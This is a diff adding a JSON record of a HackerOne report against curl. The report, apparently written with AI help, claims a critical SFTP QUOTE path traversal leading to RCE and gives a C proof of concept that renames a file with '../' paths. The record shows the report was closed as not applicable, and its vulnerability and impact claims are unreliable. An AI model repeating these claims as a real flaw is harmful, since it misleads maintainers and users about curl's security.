@@ -1,0 +1,147 @@
+{
+  "id": 3293177,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjkzMTc3",
+  "url": "https://hackerone.com/reports/3293177",
+  "title": "Path Traversal in SFTP QUOTE command leads to Arbitrary File Write and potential RCE",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "critical",
+  "readable_substate": "N/A",
+  "created_at": "2025-08-09T20:00:01.567Z",
+  "submitted_at": "2025-08-09T20:00:01.901Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "z1andr4g0n",
+    "url": "/z1andr4g0n",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/kkf2ht5x1j8m43mtj958p7rdemx7/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-08-10T21:37:57.965Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-08-10T16:21:49.504Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Description\n\n#### Summary\n`libcurl` is vulnerable to a path traversal attack when processing SFTP `QUOTE` commands. The internal function `Curl_get_pathname` in `lib/vssh/curl_path.c` fails to sanitize user-provided paths for traversal sequences (`../`). An attacker who can control the SFTP `QUOTE` commands can leverage this to perform arbitrary file operations (rename, delete, and with `STOR`, write) outside of the user's intended directory. This can be escalated to Remote Code Execution (RCE) on the SFTP server by overwriting sensitive files like `authorized_keys` or system scripts.\n\n#### AI Usage Disclosure\nIn accordance with your policy, I disclose that this report was the result of a collaborative effort between myself and an AI assistant. The AI was used to analyze the source code, suggest potential vulnerabilities, and assist in structuring the report, while I guided the process, made the final decisions, and manually verified all findings, including the vulnerability analysis and Proof of Concept code.\n\n---\n\n#### Affected version\nThis was reproduced on a system using libcurl linked with libssh2. The vulnerability is in `libcurl`'s own path handling code and is likely present in recent versions. The `curl -V` output on the test system is:\n```\nDragon@DESKTOP-2CIPGDF MINGW64 /c/Users/Dragon/Desktop\n# curl -V\ncurl 8.15.0 (Windows) libcurl/8.15.0 OpenSSL/3.5.0 zlib/1.3.1 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8\nlibpsl/0.21.5 libssh2/1.11.1 nghttp2/1.65.0 ngtcp2/1.13.0 nghttp3/1.10.1\nRelease-Date: 2025-07-16\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 po\np3s rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS brotli HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTL\nM PSL SPNEGO SSL SSPI threadsafe TLS-SRP UnixSockets zstd\n```\n\n#### Steps To Reproduce\nThis vulnerability can be reliably reproduced in a local Windows environment.\n\n1.  **[Setup Step 1] Install and Run OpenSSH Server:**\n    *   On a Windows 10/11 machine, install the \"OpenSSH Server\" via Optional Features (`Settings -> Apps -> Optional features -> Add a feature`).\n    *   Start the service using PowerShell (as Admin): `Start-Service sshd` and set it to automatic: `Set-Service -Name sshd -StartupType 'Automatic'`.\n    *   Create a local test user: `net user testuser testpass /add`.\n\n2.  **[Setup Step 2] Prepare Target Files and Directories:**\n    *   Create a file to be moved in the test user's home directory:\n        `echo. > C:\\Users\\testuser\\file_to_move.txt`\n    *   Create the target directory for the attack:\n        `mkdir C:\\tmp\\attack_target`\n    *   Grant the test user permissions on the target directory:\n        `icacls C:\\tmp\\attack_target /grant testuser:(OI)(CI)F`\n\n3.  **[Setup Step 3] Proof of Concept Code (`poc.c`):**\n    *   Save the following C code as `poc.c`. This program uses `libcurl` to connect to the local SFTP server and issue a malicious `rename` command.\n\n    ```c\n    #include <stdio.h>\n    #include <curl/curl.h>\n\n    int main(void) {\n        CURL *curl;\n        CURLcode res;\n        struct curl_slist *quote_list = NULL;\n\n        const char *malicious_rename =\n            \"rename file_to_move.txt ../../tmp/attack_target/SUCCESS.txt\";\n        \n        quote_list = curl_slist_append(quote_list, malicious_rename);\n\n        curl_global_init(CURL_GLOBAL_DEFAULT);\n        curl = curl_easy_init();\n        if(curl) {\n            curl_easy_setopt(curl, CURLOPT_URL, \"sftp://127.0.0.1/\");\n            curl_easy_setopt(curl, CURLOPT_USERNAME, \"testuser\");\n            curl_easy_setopt(curl, CURLOPT_PASSWORD, \"testpass\");\n            curl_easy_setopt(curl, CURLOPT_SSH_KNOWNHOSTS, NULL);\n            curl_easy_setopt(curl, CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256, NULL);\n            curl_easy_setopt(curl, CURLOPT_POSTQUOTE, quote_list);\n            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);\n\n            res = curl_easy_perform(curl);\n            \n            if(res != CURLE_OK) {\n                fprintf(stderr, \"curl_easy_perform() failed: %s\\n\",\n                        curl_easy_strerror(res));\n            }\n        \n            curl_easy_cleanup(curl);\n        }\n        curl_slist_free_all(quote_list);\n        curl_global_cleanup();\n        return 0;\n    }\n    ```\n\n4.  **[Execution Step 4] Compile and Run:**\n    *   Install a MinGW-w64 toolchain (e.g., via MSYS2).\n    *   Compile the PoC: `gcc poc.c -lcurl -o poc.exe`\n    *   Run the PoC: `./poc.exe`\n\n5.  **[Verification Step 5] Verify the Exploit:**\n    *   Check the contents of the target directory: `dir C:\\tmp\\attack_target`\n    *   **Result:** The file **`SUCCESS.txt`** will be present in the directory, proving that the `rename` operation successfully traversed out of the user's home directory (`C:\\Users\\testuser`) and wrote to `C:\\tmp\\attack_target`.\n\n#### Supporting Material/References:\nThe vulnerability is in the function `Curl_get_pathname` in the file `lib/vssh/curl_path.c`. The function copies the user-provided path from a `QUOTE` command into the output buffer without validating or sanitizing `../` sequences, leading to the path traversal vulnerability.\n\n## Impact\n\nThis vulnerability allows an attacker with SFTP access (even if ostensibly jailed or restricted to a home directory) to perform arbitrary file operations on any part of the filesystem where the user has OS-level permissions.\n\nThis can be directly escalated to **Remote Code Execution (RCE)**. An attacker could:\n*   Overwrite a user's `~/.ssh/authorized_keys` file to gain persistent SSH access.\n*   Overwrite system scripts, application binaries, or configuration files.\n*   Write to web server directories to achieve web-based RCE.\n\nThis is a critical vulnerability as it completely breaks the security model of SFTP directory restrictions and can lead to a full server compromise.",
+  "weakness": {
+    "id": 125,
+    "name": "Relative Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4661915,
+      "file_name": "Curl-v.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wo3sswhtrngulhyop6f7buksbcvs?response-content-disposition=attachment%3B%20filename%3D%22Curl-v.PNG%22%3B%20filename%2A%3DUTF-8%27%27Curl-v.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSSX4PF7P%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDQusVNLjCt%2FuBhh7xi96%2FrI%2F9WAT5cgq5%2B3FFoGruxTgIhALg7JIrskKGjBetGQAmmfe1z7a5bE7gY%2F06r2NvAnAjCKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwqwTsKONVhYRraIvMqjgVC5KT3I9QkEEPBtzVlxI%2BSLp3mtg9ycg980Xzj6ZLciCWwLlP2DuVFXWxA9bAmiGUo7KaswGSkewR8algAkT3aFlF%2Fep0ny3bgRKNSRB9BvWL9xngfoGfhmLrI2h99CYJzR1NzXi%2FrHzIoetyIvPhgZEFKsmfgGsK%2Bhzn2lYoD%2B7pH11Vz8mEFSxSmH5BESHp%2FlnMDyOFRKJhurZwu3yA93wd1pBpjgIQt7bBxgAZ3Il8vC69IHJetuSOigexyTInNbXsCIaIMV00A7kg4bkzUYxSNk44lfWXjGdLqcsDUUh4x4SsfvnnOvPrAEgY1z0kNDXyjAA928FTDEkP8YryUfVH4XBNRc6wnbIWkIVdk87BXjTITGLxo575OvopCF8SCRKYXEmQMoqb9m%2B%2FvdB9T17uulq%2FJHOK%2FUI1jq8Sg9nN%2Bo6NMHYzZBIItsUuAtyRh3wA508HLNhY462Hc6q22jaM%2B6yuvLQxrH2JDaUGHB9%2BFc0Wlnl5Y7J8lEIXS53gvcL%2FDIarXoSzzcLehljw%2FWIG4X%2BxGA2GiIvMaDaiUI4ohkK8D25L%2FgJv4Yzxxj2s5uCoAHXm0wc0CSgof7BVMm8A4if2XVOTtR6DMoFNl5aDow9wKFgEY32jvoY1ZK5fWsiRLSORmhD6rv%2Fe%2FU5jlywxdE8fZu%2Bsq3v3Hk%2FNztrWWPQxJvXeiikDDhU5j0pcbVYJ9Y6%2BZOnLH5njdxiMH90V%2BwFNNKxDL4vZe1ljFNAjMrF9xyoYvTsgrl6apkDnVV%2FFiNKBc4aHk5sxRzJfb2v8FLmc%2FU9PYaS4PeIy9HiLZ3nRfcCYnsj8%2Bv9hr8LGvD4i4bWvbdArCbRAdXrbHr6zovw1a%2Fe7l3BzXsx8w74f9zwY6sAF8GG9BQ0QzMMg0cJMl5Sx96h6Z%2BYiVxfLTqpCU9dnZzNF%2BqreIu2i6TF0QEUTcVtCYKqAzZW%2FMa5kUOffAyF%2FEtYOBUU66H%2Bki7o1tiUub7pcVdQiAXbU76nS%2BWi4OxH7r9NpEVMVS7Xs1ciVid0dhcHjYDcYTZgjyFuX%2FOsICg%2FzNiFaK9B8ecrHTqExgOmrJe0Gb0fVdPGQgT%2F0xDHAKpelWW%2FpkUjgofocIYajmHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1630ad37f9812acccca9b2a2682fb33fe73e5378d71ed98ec2c2e467958350c9",
+      "file_size": 10821,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 4661925,
+      "file_name": "poc.c",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cpf0xzkgmk9z11hoc875mor4z5zu?response-content-disposition=attachment%3B%20filename%3D%22poc.c%22%3B%20filename%2A%3DUTF-8%27%27poc.c&response-content-type=text%2Fx-c%2B%2Bsrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSSX4PF7P%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDQusVNLjCt%2FuBhh7xi96%2FrI%2F9WAT5cgq5%2B3FFoGruxTgIhALg7JIrskKGjBetGQAmmfe1z7a5bE7gY%2F06r2NvAnAjCKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwqwTsKONVhYRraIvMqjgVC5KT3I9QkEEPBtzVlxI%2BSLp3mtg9ycg980Xzj6ZLciCWwLlP2DuVFXWxA9bAmiGUo7KaswGSkewR8algAkT3aFlF%2Fep0ny3bgRKNSRB9BvWL9xngfoGfhmLrI2h99CYJzR1NzXi%2FrHzIoetyIvPhgZEFKsmfgGsK%2Bhzn2lYoD%2B7pH11Vz8mEFSxSmH5BESHp%2FlnMDyOFRKJhurZwu3yA93wd1pBpjgIQt7bBxgAZ3Il8vC69IHJetuSOigexyTInNbXsCIaIMV00A7kg4bkzUYxSNk44lfWXjGdLqcsDUUh4x4SsfvnnOvPrAEgY1z0kNDXyjAA928FTDEkP8YryUfVH4XBNRc6wnbIWkIVdk87BXjTITGLxo575OvopCF8SCRKYXEmQMoqb9m%2B%2FvdB9T17uulq%2FJHOK%2FUI1jq8Sg9nN%2Bo6NMHYzZBIItsUuAtyRh3wA508HLNhY462Hc6q22jaM%2B6yuvLQxrH2JDaUGHB9%2BFc0Wlnl5Y7J8lEIXS53gvcL%2FDIarXoSzzcLehljw%2FWIG4X%2BxGA2GiIvMaDaiUI4ohkK8D25L%2FgJv4Yzxxj2s5uCoAHXm0wc0CSgof7BVMm8A4if2XVOTtR6DMoFNl5aDow9wKFgEY32jvoY1ZK5fWsiRLSORmhD6rv%2Fe%2FU5jlywxdE8fZu%2Bsq3v3Hk%2FNztrWWPQxJvXeiikDDhU5j0pcbVYJ9Y6%2BZOnLH5njdxiMH90V%2BwFNNKxDL4vZe1ljFNAjMrF9xyoYvTsgrl6apkDnVV%2FFiNKBc4aHk5sxRzJfb2v8FLmc%2FU9PYaS4PeIy9HiLZ3nRfcCYnsj8%2Bv9hr8LGvD4i4bWvbdArCbRAdXrbHr6zovw1a%2Fe7l3BzXsx8w74f9zwY6sAF8GG9BQ0QzMMg0cJMl5Sx96h6Z%2BYiVxfLTqpCU9dnZzNF%2BqreIu2i6TF0QEUTcVtCYKqAzZW%2FMa5kUOffAyF%2FEtYOBUU66H%2Bki7o1tiUub7pcVdQiAXbU76nS%2BWi4OxH7r9NpEVMVS7Xs1ciVid0dhcHjYDcYTZgjyFuX%2FOsICg%2FzNiFaK9B8ecrHTqExgOmrJe0Gb0fVdPGQgT%2F0xDHAKpelWW%2FpkUjgofocIYajmHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6220c607d9b5489878e42b9cf304cbe62673937d9400589845cb50466ff56791",
+      "file_size": 2207,
+      "type": "text/x-c++src",
+      "moderated": null
+    },
+    {
+      "id": 4661932,
+      "file_name": "PoC.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gojzda86tu6kslfwamkbb5hycwur?response-content-disposition=attachment%3B%20filename%3D%22PoC.mp4%22%3B%20filename%2A%3DUTF-8%27%27PoC.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSSX4PF7P%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDQusVNLjCt%2FuBhh7xi96%2FrI%2F9WAT5cgq5%2B3FFoGruxTgIhALg7JIrskKGjBetGQAmmfe1z7a5bE7gY%2F06r2NvAnAjCKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwqwTsKONVhYRraIvMqjgVC5KT3I9QkEEPBtzVlxI%2BSLp3mtg9ycg980Xzj6ZLciCWwLlP2DuVFXWxA9bAmiGUo7KaswGSkewR8algAkT3aFlF%2Fep0ny3bgRKNSRB9BvWL9xngfoGfhmLrI2h99CYJzR1NzXi%2FrHzIoetyIvPhgZEFKsmfgGsK%2Bhzn2lYoD%2B7pH11Vz8mEFSxSmH5BESHp%2FlnMDyOFRKJhurZwu3yA93wd1pBpjgIQt7bBxgAZ3Il8vC69IHJetuSOigexyTInNbXsCIaIMV00A7kg4bkzUYxSNk44lfWXjGdLqcsDUUh4x4SsfvnnOvPrAEgY1z0kNDXyjAA928FTDEkP8YryUfVH4XBNRc6wnbIWkIVdk87BXjTITGLxo575OvopCF8SCRKYXEmQMoqb9m%2B%2FvdB9T17uulq%2FJHOK%2FUI1jq8Sg9nN%2Bo6NMHYzZBIItsUuAtyRh3wA508HLNhY462Hc6q22jaM%2B6yuvLQxrH2JDaUGHB9%2BFc0Wlnl5Y7J8lEIXS53gvcL%2FDIarXoSzzcLehljw%2FWIG4X%2BxGA2GiIvMaDaiUI4ohkK8D25L%2FgJv4Yzxxj2s5uCoAHXm0wc0CSgof7BVMm8A4if2XVOTtR6DMoFNl5aDow9wKFgEY32jvoY1ZK5fWsiRLSORmhD6rv%2Fe%2FU5jlywxdE8fZu%2Bsq3v3Hk%2FNztrWWPQxJvXeiikDDhU5j0pcbVYJ9Y6%2BZOnLH5njdxiMH90V%2BwFNNKxDL4vZe1ljFNAjMrF9xyoYvTsgrl6apkDnVV%2FFiNKBc4aHk5sxRzJfb2v8FLmc%2FU9PYaS4PeIy9HiLZ3nRfcCYnsj8%2Bv9hr8LGvD4i4bWvbdArCbRAdXrbHr6zovw1a%2Fe7l3BzXsx8w74f9zwY6sAF8GG9BQ0QzMMg0cJMl5Sx96h6Z%2BYiVxfLTqpCU9dnZzNF%2BqreIu2i6TF0QEUTcVtCYKqAzZW%2FMa5kUOffAyF%2FEtYOBUU66H%2Bki7o1tiUub7pcVdQiAXbU76nS%2BWi4OxH7r9NpEVMVS7Xs1ciVid0dhcHjYDcYTZgjyFuX%2FOsICg%2FzNiFaK9B8ecrHTqExgOmrJe0Gb0fVdPGQgT%2F0xDHAKpelWW%2FpkUjgofocIYajmHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1a5eaf63e20532592bbfb0e1a7cc40e8b01bd780049bcbd29cee6c6523d4fd8b",
+      "file_size": 1278404,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 10,
+  "voters": [
+    "thalaivar304",
+    "2026",
+    "mai91",
+    "johnnywatters",
+    "wh1tec0re",
+    "0xhamdoon",
+    "b14cksh33p",
+    "0xs3iif",
+    "xx_z",
+    "0x0000dead"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
